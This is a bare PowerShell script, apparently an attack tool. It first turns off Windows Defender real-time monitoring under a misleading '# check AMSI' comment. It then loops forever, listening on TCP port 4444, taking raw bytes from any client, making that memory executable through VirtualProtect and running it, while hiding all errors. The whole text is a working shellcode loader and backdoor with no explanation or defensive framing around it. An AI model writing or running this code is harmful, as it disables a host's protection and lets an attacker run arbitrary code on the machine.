# check AMSI
Set-MpPreference -DisableRealtimeMonitoring $true

# script
while($true){try{$l=[System.Net.Sockets.TcpListener]4444;$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();$b=New-Object Byte[] 4096;$r=$s.Read($b,0,4096);$m=[Runtime.InteropServices.Marshal]::AllocHGlobal($r);[Runtime.InteropServices.Marshal]::Copy($b,0,$m,$r);$o=0;$v=@'
[DllImport("kernel32.dll")]public static extern bool VirtualProtect(IntPtr a,uint b,uint c,out uint d);
'@;Add-Type -MemberDefinition $v -Name "W" -Namespace "X" -ErrorAction SilentlyContinue;[X.W]::VirtualProtect($m,$r,0x40,[ref]$o);([Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($m,[Action]))();$l.Stop()}catch{}}